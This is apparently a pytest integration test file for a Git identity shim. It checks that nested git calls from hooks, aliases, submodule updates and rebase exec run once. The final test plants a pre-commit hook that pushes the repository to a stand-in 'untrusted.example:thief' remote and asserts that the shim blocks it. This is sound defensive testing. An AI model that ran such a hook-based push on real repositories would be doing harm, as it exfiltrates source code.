"""Integration coverage for loop-free Git continuations (T032/T033)."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

_SRC = Path(__file__).resolve().parents[2] / "src"
_SENTINEL = "__GIT_SHIM_CONTINUATION"


def _shim_env(real_git: str, shim_bin: Path, **overrides: str) -> dict[str, str]:
    env = dict(os.environ)
    existing = env.get("PYTHONPATH")
    env["PYTHONPATH"] = str(_SRC) + (os.pathsep + existing if existing else "")
    env["PATH"] = str(shim_bin) + os.pathsep + env.get("PATH", "")
    env["GIT_SHIM_REAL_PATH"] = real_git
    env["GIT_SHIM_TEST_PATH"] = str(shim_bin).replace("\\", "/")
    env["GIT_SHIM_MODE"] = "agent"
    env.update(overrides)
    return env


def _install_git_shim(bin_dir: Path, entry_log: Path) -> None:
    bin_dir.mkdir()
    python = sys.executable.replace("\\", "/")
    entry = str(entry_log).replace("\\", "/")
    shell_shim = bin_dir / "git"
    shell_shim.write_text(
        "#!/bin/sh\n"
        f"printf '%s\\n' \"${{{_SENTINEL}:-caller}}\" >> '{entry}'\n"
        f"exec '{python}' -m git_author_shim \"$@\"\n",
        encoding="utf-8",
    )
    shell_shim.chmod(0o755)
    if os.name == "nt":
        (bin_dir / "git.cmd").write_text(
            "@echo off\n"
            f'if defined {_SENTINEL} (>>"{entry_log}" echo %{_SENTINEL}%) '
            f'else (>>"{entry_log}" echo caller)\n'
            f'"{sys.executable}" -m git_author_shim %*\n',
            encoding="utf-8",
        )


def _run_git(repo, env: dict[str, str], *args: str) -> subprocess.CompletedProcess[str]:
    launcher = Path(env["GIT_SHIM_TEST_PATH"]) / ("git.cmd" if os.name == "nt" else "git")
    return subprocess.run(  # noqa: S603
        [str(launcher), *args],
        cwd=repo.path,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=120,
    )


def _write_identity_config(isolated_env, key_file: Path) -> Path:
    return isolated_env.write_config(
        "[[identities]]\n"
        'id = "acme"\n'
        'name = "Acme Bot"\n'
        'email = "bot@acme.invalid"\n'
        'match_patterns = ["github.com/acme/*"]\n\n'
        "[identities.ssh]\n"
        f"key_file = {json.dumps(str(key_file))}\n"
    )


def test_pre_commit_hook_git_call_is_a_single_continuation(
    isolated_env, temp_repo, tmp_path
) -> None:
    repo = temp_repo("hook", remotes={"origin": "git@github.com:acme/app.git"})
    key_file = tmp_path / "bot-key"
    key_file.write_text("test key", encoding="utf-8")
    config_path = _write_identity_config(isolated_env, key_file)
    entry_log = tmp_path / "shim-entries"
    shim_bin = tmp_path / "shim-bin"
    _install_git_shim(shim_bin, entry_log)
    hook_count = tmp_path / "hook-count"
    hook = repo.git_dir / "hooks" / "pre-commit"
    hook.write_text(
        "#!/bin/sh\n"
        f'test "${_SENTINEL}" = 1 || exit 91\n'
        f"printf 'malformed = [' > '{str(config_path).replace('\\', '/')}'\n"
        '"$GIT_SHIM_TEST_PATH/git" diff --cached --quiet\n'
        f"printf ran >> '{str(hook_count).replace('\\', '/')}'\n",
        encoding="utf-8",
    )
    hook.chmod(0o755)
    (repo.path / "work.txt").write_text("work\n", encoding="utf-8")
    repo.git("add", "work.txt")

    result = _run_git(repo, _shim_env(repo.git_binary, shim_bin), "commit", "-m", "hooked")

    assert result.returncode == 0, result.stderr
    assert hook_count.read_text(encoding="utf-8") == "ran"
    assert entry_log.read_text(encoding="utf-8").splitlines() == ["caller", "1"]


def test_shell_alias_git_call_completes_once_as_a_continuation(
    isolated_env, temp_repo, tmp_path
) -> None:
    repo = temp_repo("alias", remotes={"origin": "git@github.com:acme/app.git"})
    key_file = tmp_path / "bot-key"
    key_file.write_text("test key", encoding="utf-8")
    _write_identity_config(isolated_env, key_file)
    entry_log = tmp_path / "shim-entries"
    shim_bin = tmp_path / "shim-bin"
    _install_git_shim(shim_bin, entry_log)
    alias_count = tmp_path / "alias-count"
    repo.config(
        "alias.nested-status",
        f'!"$GIT_SHIM_TEST_PATH/git" status --porcelain '
        f"&& printf ran >> '{str(alias_count).replace('\\', '/')}'",
    )

    result = _run_git(repo, _shim_env(repo.git_binary, shim_bin), "nested-status")

    assert result.returncode == 0, result.stderr
    assert alias_count.read_text(encoding="utf-8") == "ran"
    assert entry_log.read_text(encoding="utf-8").splitlines() == ["caller", "1"]


def test_submodule_update_completes_with_shim_first_on_path(
    isolated_env, temp_repo, tmp_path
) -> None:
    child = temp_repo("child")
    (child.path / "child.txt").write_text("child\n", encoding="utf-8")
    child.git("add", "child.txt")
    child.commit("child contents", allow_empty=False)
    parent = temp_repo("parent", remotes={"origin": "git@github.com:acme/app.git"})
    parent.git(
        "-c", "protocol.file.allow=always", "submodule", "add", str(child.path), "deps/child"
    )
    parent.commit("add submodule", allow_empty=False)
    parent.git("submodule", "deinit", "-f", "deps/child")
    checkout = parent.path / "deps" / "child"
    key_file = tmp_path / "bot-key"
    key_file.write_text("test key", encoding="utf-8")
    _write_identity_config(isolated_env, key_file)
    entry_log = tmp_path / "shim-entries"
    shim_bin = tmp_path / "shim-bin"
    _install_git_shim(shim_bin, entry_log)
    update_count = tmp_path / "submodule-update-count"
    parent.config(
        "submodule.deps/child.update",
        '!f() { "$GIT_SHIM_TEST_PATH/git" checkout "$1" '
        f"&& printf ran >> '{str(update_count).replace('\\', '/')}'; }}; f",
    )

    result = _run_git(
        parent,
        _shim_env(parent.git_binary, shim_bin),
        "-c",
        "protocol.file.allow=always",
        "submodule",
        "update",
        "--init",
        "deps/child",
    )

    assert result.returncode == 0, result.stderr
    assert (checkout / "child.txt").read_text(encoding="utf-8") == "child\n"
    assert update_count.read_text(encoding="utf-8") == "ran"
    assert entry_log.read_text(encoding="utf-8").splitlines() == ["caller", "1"]


def test_rebase_exec_git_call_completes_once_as_a_continuation(
    isolated_env, temp_repo, tmp_path
) -> None:
    repo = temp_repo("rebase", remotes={"origin": "git@github.com:acme/app.git"})
    (repo.path / "one.txt").write_text("one\n", encoding="utf-8")
    repo.git("add", "one.txt")
    repo.commit("one", allow_empty=False)
    (repo.path / "two.txt").write_text("two\n", encoding="utf-8")
    repo.git("add", "two.txt")
    repo.commit("two", allow_empty=False)
    key_file = tmp_path / "bot-key"
    key_file.write_text("test key", encoding="utf-8")
    _write_identity_config(isolated_env, key_file)
    entry_log = tmp_path / "shim-entries"
    shim_bin = tmp_path / "shim-bin"
    _install_git_shim(shim_bin, entry_log)
    exec_count = tmp_path / "exec-count"
    command = (
        '"$GIT_SHIM_TEST_PATH/git" status --porcelain '
        f"&& printf ran >> '{str(exec_count).replace('\\', '/')}'"
    )

    result = _run_git(
        repo,
        _shim_env(repo.git_binary, shim_bin),
        "rebase",
        "--exec",
        command,
        "HEAD~2",
    )

    assert result.returncode == 0, result.stderr
    assert exec_count.read_text(encoding="utf-8") == "ranran"
    assert entry_log.read_text(encoding="utf-8").splitlines() == ["caller", "1", "1"]


def test_nested_write_to_unconfigured_host_still_fails_closed(
    isolated_env, temp_repo, tmp_path
) -> None:
    repo = temp_repo("nested-security", remotes={"origin": "git@github.com:acme/app.git"})
    key_file = tmp_path / "bot-key"
    key_file.write_text("test key", encoding="utf-8")
    _write_identity_config(isolated_env, key_file)
    entry_log = tmp_path / "shim-entries"
    shim_bin = tmp_path / "shim-bin"
    _install_git_shim(shim_bin, entry_log)
    hook = repo.git_dir / "hooks" / "pre-commit"
    hook.write_text(
        "#!/bin/sh\n"
        '"$GIT_SHIM_TEST_PATH/git" '
        "push git@untrusted.example:thief/repo.git HEAD:main\n",
        encoding="utf-8",
    )
    hook.chmod(0o755)

    result = _run_git(
        repo,
        _shim_env(repo.git_binary, shim_bin),
        "commit",
        "--allow-empty",
        "-m",
        "must fail",
    )

    assert result.returncode != 0
    assert "untrusted.example/thief/repo" in result.stderr
    assert repo.git("log", "-1", "--format=%s").stdout.strip() != "must fail"
